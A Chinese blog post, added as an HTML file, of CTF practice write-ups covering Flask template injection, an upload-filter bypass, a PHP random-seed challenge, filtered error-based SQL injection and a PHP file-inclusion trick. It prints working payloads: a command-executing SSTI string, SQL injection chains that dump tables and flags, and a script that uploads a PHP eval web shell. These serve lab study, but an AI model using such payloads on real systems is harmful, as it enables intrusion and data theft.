@@ -1,0 +1,311 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>一周CTF（5） | skkyblu3&#39;s Blog</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1688904911482">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="一周CTF（5） | skkyblu3&#39;s Blog - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="BUU
+[CSCCTF 2019 Qual]FlaskLight
+SSTI
+
+[].__class__.__base__.__subclasses__()获得object子类，过滤了globals，但是子类中有subprocess.Pope..." />
+    <meta name="keywords" content="日常,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1688904911482" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3&#39;s Blog
+  </h1>
+  <p class="site-description">
+    sky, blue and ...
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://skyblu3519.github.io/post/you-lian" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              一周CTF（5）
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-07-09
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/k_UdJm9MZ/" class="post-tag">
+                  # 日常
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/yizhouctf5.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="buu">BUU</h1>
+<h2 id="cscctf-2019-qualflasklight">[CSCCTF 2019 Qual]FlaskLight</h2>
+<p>SSTI<br>
+<img src="https://skyblu3519.github.io/post-images/1688904471812.png" alt="" loading="lazy"></p>
+<p><code>[].__class__.__base__.__subclasses__()</code>获得object子类，过滤了<code>globals</code>，但是子类中有<code>subprocess.Popen</code>，可以直接执行命令：<code>?search={{[].__class__.__base__.__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}</code></p>
+<p>flag位置为<code>/flasklight/coomme_geeeett_youur_flek</code>，ez😄<br>
+<img src="https://skyblu3519.github.io/post-images/1688904481308.png" alt="" loading="lazy"></p>
+<h2 id="wustctf2020cv-maker">[WUSTCTF2020]CV Maker</h2>
+<p>文件上传，修改文件头绕过。</p>
+<p>注册登录进去有一个头像上传功能，随便上传一个<code>txt</code>，页面提示<code>exif_imagetype not image!</code>。</p>
+<p>修改文件头<code>GIF89</code>，上传PHP<br>
+<img src="https://skyblu3519.github.io/post-images/1688904519393.png" alt="" loading="lazy"></p>
+<p>ezez<br>
+<img src="https://skyblu3519.github.io/post-images/1688904512125.png" alt="" loading="lazy"></p>
+<h2 id="gwctf-2019枯燥的抽奖">[GWCTF 2019]枯燥的抽奖</h2>
+<p>从源码中知道<code>check.php</code>的存在，这里写了判断逻辑</p>
+<pre><code class="language-php">&lt;?php
+# 这不是抽奖程序的源代码！不许看！
+header(&quot;Content-Type: text/html;charset=utf-8&quot;);
+session_start();
+if(!isset($_SESSION['seed'])){
+$_SESSION['seed']=rand(0,999999999);
+}
+
+mt_srand($_SESSION['seed']);
+$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+$str='';
+$len1=20;
+for ( $i = 0; $i &lt; $len1; $i++ ){
+    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
+}
+$str_show = substr($str, 0, 10);
+echo &quot;&lt;p id='p1'&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;
+
+
+if(isset($_POST['num'])){
+    if($_POST['num']===$str){x
+        echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p&gt;&quot;;
+    }
+    else{
+        echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;;
+    }
+}
+show_source(&quot;check.php&quot;);
+</code></pre>
+<p>根据代码得知知道seed就可以知道最后的str，使用的工具是<a href="https://github.com/openwall/php_mt_seed">php_mt_seed</a>。（ARM无法使用，暂时搁置）<br>
+<a href="https://www.freebuf.com/vuls/192012.html">https://www.freebuf.com/vuls/192012.html</a><br>
+<a href="https://blog.csdn.net/RABCDXB/article/details/119246038">https://blog.csdn.net/RABCDXB/article/details/119246038</a></p>
+<h2 id="nctf2019true-xml-cookbook">[NCTF2019]True XML cookbook</h2>
+<p><a href="https://skyblu3519.github.io/post/nctf2019true-xml-cookbook/">题解</a></p>
+<h2 id="rctf2015easysql">[RCTF2015]EasySQL</h2>
+<p>二次注入。</p>
+<p>注册用户名为<code>admin&quot;</code>登录，在修改密码的页面产生报错。修改密码的语句可能</p>
+<pre><code class="language-sql">UPDATE users SET PASSWORD=&quot;$pass&quot; WHERE username=&quot;$username&quot; and password=&quot;$curr_pass&quot;
+</code></pre>
+<p>注册<code>admin&quot;#</code>登录修改密码可以改掉admin的密码，但是里面并没有东西。</p>
+<p>报错注入</p>
+<ul>
+<li><code>or</code>过滤使用<code>||</code>代替</li>
+<li>空格、<code>/**/</code>过滤使用<code>()</code>代替</li>
+<li></li>
+</ul>
+<pre><code class="language-sql">admin&quot;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1))#
+
+XPATH syntax error: '~article,flag,users~'
+
+admin&quot;||(updatexml(1,concat(0x7e,(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')),0x7e),1)),0x7e),1))#
+
+XPATH syntax error: '~name,pwd,email,real_flag_1s_her'
+</code></pre>
+<p>从没有末尾的～得知结果不全。经过测试，过滤了substr和mid。为了获取完整的列名使用正则匹配<code>regexp</code></p>
+<pre><code class="language-sql">admin&quot;||(updatexml(1,concat(0x7e,(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')&amp;&amp;(column_name)regexp('^r')),0x7e),1)),0x7e),1))#
+
+XPATH syntax error: '~real_flag_1s_here~'
+
+admin&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e),1))#
+
+XPATH syntax error: '~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx'
+</code></pre>
+<p>使用刚刚的方法查以<code>f</code>开头的内容</p>
+<pre><code class="language-sql">admin&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)REGEXP('^f')),0x7e),1))#
+
+XPATH syntax error: '~flag{4bf92c23-fc90-4f55-849d-2a'
+
+admin&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)REGEXP('^2a')),0x7e),1))#
+想这样查后面的内容，不知道为什么不行
+</code></pre>
+<p>使用reverse()读取剩下的内容</p>
+<pre><code class="language-sql">admin&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)REGEXP('^f'))),0x7e),1))#
+
+XPATH syntax error: '~}5c030d9faea2-d948-55f4-09cf-32'
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1688904642595.png" alt="" loading="lazy"></figure>
+<p>这个REGEXP之后抽时间再看看吧🥱</p>
+<h2 id="ciscn2019-华北赛区-day1-web1dropbox">[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2>
+<p><a href="https://skyblu3519.github.io/post/phar-fan-xu-lie-hua-xue-xi/#ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day1-web1dropbox">题解</a></p>
+<h2 id="npuctf2020ezinclude">[NPUCTF2020]ezinclude</h2>
+<p>根据提示GET穿参，<code>?name=&amp;pass=</code>。set-cookie中有hash字段，传入的pass对应这个hash，使用bp开始跳转。</p>
+<p><code>/flflflflag.php</code>中存在文件包含<br>
+<img src="https://skyblu3519.github.io/post-images/1688904703234.png" alt="" loading="lazy"></p>
+<p>考点：<a href="https://qftm.github.io/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/">php7 segment fault特性</a></p>
+<p>解法：跑个脚本</p>
+<pre><code class="language-php">import requests
+from io import BytesIO
+
+payload = &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;
+data={'file': BytesIO(payload.encode())}
+url=&quot;http://5ce4fabc-571d-413f-9fa5-e49806f39a19.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;
+r=requests.post(url=url,files=data,allow_redirects=False)
+</code></pre>
+<p>访问扫描出的<code>dir.php</code>，得到tmp下生成的文件名<br>
+<img src="https://skyblu3519.github.io/post-images/1688904724191.png" alt="" loading="lazy"><br>
+包含执行<code>phpinfo()</code>得到flag。<br>
+<img src="https://skyblu3519.github.io/post-images/1688904730213.png" alt="" loading="lazy"></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#buu">BUU</a>
+<ul>
+<li><a href="#cscctf-2019-qualflasklight">[CSCCTF 2019 Qual]FlaskLight</a></li>
+<li><a href="#wustctf2020cv-maker">[WUSTCTF2020]CV Maker</a></li>
+<li><a href="#gwctf-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96">[GWCTF 2019]枯燥的抽奖</a></li>
+<li><a href="#nctf2019true-xml-cookbook">[NCTF2019]True XML cookbook</a></li>
+<li><a href="#rctf2015easysql">[RCTF2015]EasySQL</a></li>
+<li><a href="#ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day1-web1dropbox">[CISCN2019 华北赛区 Day1 Web1]Dropbox</a></li>
+<li><a href="#npuctf2020ezinclude">[NPUCTF2020]ezinclude</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/phar-fan-xu-lie-hua-xue-xi/">
+              <h3 class="post-title">
+                Phar 反序列化学习
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
